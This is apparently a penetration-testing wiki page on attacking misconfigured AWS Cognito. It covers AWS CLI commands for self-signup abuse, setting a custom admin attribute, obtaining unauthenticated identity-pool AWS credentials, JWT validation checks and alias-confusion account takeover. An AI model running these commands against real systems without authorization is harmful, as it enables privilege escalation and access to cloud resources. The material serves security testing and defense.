# Cognito

> tags: cloud, aws, intermediate, advanced

> related: Attack-Surface/Cloud/AWS/IAM-Privilege-Escalation, Attack-Surface/Cloud/AWS/, Attack-Surface/Cloud/AWS/S3-Misconfiguration

AWS Cognito
Cognito is AWS's managed auth service and it's consistently misconfigured. The main attack vectors: self-signup enabled when it shouldn't be, custom attributes that can be manipulated to escalate privileges, identity pool configs that hand out AWS credentials too freely, and token handling that apps implement incorrectly.
Recon: Identifying Cognito
Look for these patterns in JS source or network traffic:
cognito-idp.REGION.amazonaws.com
cognito-identity.amazonaws.com
UserPoolId: us-east-1_XXXXXXXXX
ClientId: XXXXXXXXXXXXXXXXXXXXXXXXXX
Check the app's JS bundle for the Amplify config or direct SDK calls - they always leak the UserPoolId and ClientId.
Self-Signup Abuse
Many apps configure Cognito to allow self-registration but then rely on email domain validation or a separate approval flow. Cognito itself doesn't care.
# Try to register an account that shouldn't be creatable
aws cognito-idp sign-up \
  --client-id YOUR_CLIENT_ID \
  --username attacker@evil.com \
  --password 'P@ssw0rd123!' \
  --region us-east-1
 
# If the user pool has no app client secret, you can do this unauth
# Check if auto-confirm is on by trying to get tokens immediately after signup
aws cognito-idp initiate-auth \
  --auth-flow USER_PASSWORD_AUTH \
  --client-id YOUR_CLIENT_ID \
  --auth-parameters USERNAME=attacker@evil.com,PASSWORD='P@ssw0rd123!'
Also try admin-only flows via the public endpoint - sometimes AdminCreateUser or AdminInitiateAuth are exposed without the ALLOW_ADMIN_USER_PASSWORD_AUTH restriction enforced.
Custom Attribute Manipulation
Cognito lets developers define custom attributes (e.g., custom:role, custom:isAdmin, custom:tier). By default, users can't write these, but if mutable: true is set and the app client has write scope on the attribute, you can set your own privilege level.
# Update your own custom attributes after authenticating
aws cognito-idp update-user-attributes \
  --access-token YOUR_ACCESS_TOKEN \
  --user-attributes Name=custom:role,Value=admin \
  --region us-east-1
 
# Then fetch a fresh token and decode the JWT to see if the attribute is reflected
aws cognito-idp get-user --access-token YOUR_ACCESS_TOKEN
After updating, call InitiateAuth again to get fresh tokens and check if the JWT claims changed. If the backend reads custom:role from the token without server-side validation, you're an admin.
Identity Pool Auth Bypass
Cognito Identity Pools hand out temporary AWS credentials. The misconfiguration: unauthenticated access is enabled, or the authenticated role is over-permissive.
# Get an identity ID without any auth (if unauthenticated access is on)
aws cognito-identity get-id \
  --identity-pool-id us-east-1:XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX \
  --region us-east-1
 
# Exchange for AWS credentials
aws cognito-identity get-credentials-for-identity \
  --identity-id us-east-1:XXXXXXXX-... \
  --region us-east-1
 
# Now test what those credentials can do
export AWS_ACCESS_KEY_ID=...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
aws sts get-caller-identity
The unauthenticated role might have S3 read/write, DynamoDB access, or other permissions that weren't intended to be public.
Token Manipulation
Cognito JWTs are RS256 signed by AWS - you can't forge them directly. But verify the app is actually validating them:

Decode the JWT (jwt.io or python3 -c "import base64,json; print(json.dumps(json.loads(base64.b64decode(TOKEN.split('.')[1]+'==').decode()),indent=2))")
Check if the app validates iss (should be https://cognito-idp.REGION.amazonaws.com/POOL_ID)
Check if the app validates aud / client_id
Try using tokens cross-pool (create account in a different user pool for the same app)
Check token expiry enforcement - some apps cache validation results

Account Takeover via Alias Confusion
If the user pool allows both email and username as login aliases, and email isn't verified before it becomes the primary login, you can sometimes claim an email that another user will later register:

Register with username legit@victim.com (as username, not email)
Target user registers with email legit@victim.com
Depending on implementation, alias resolution may cause confusion

Public Reports

Cognito user pool allows self-signup and self-assignment of admin custom attribute - HackerOne #1277920
Unauthenticated Cognito Identity Pool hands out AWS credentials with S3 write access - HackerOne #1249462
Cognito token not validated for audience claim, allows cross-app token reuse - HackerOne Hacktivity search
AWS Cognito client secret exposed in mobile app allows offline token generation - HackerOne #1093730

Related

IAM Privilege Escalation - Cognito Identity Pool creds feed into IAM
AWS Overview
S3 Misconfiguration - unauthenticated identity pool roles often have S3 access
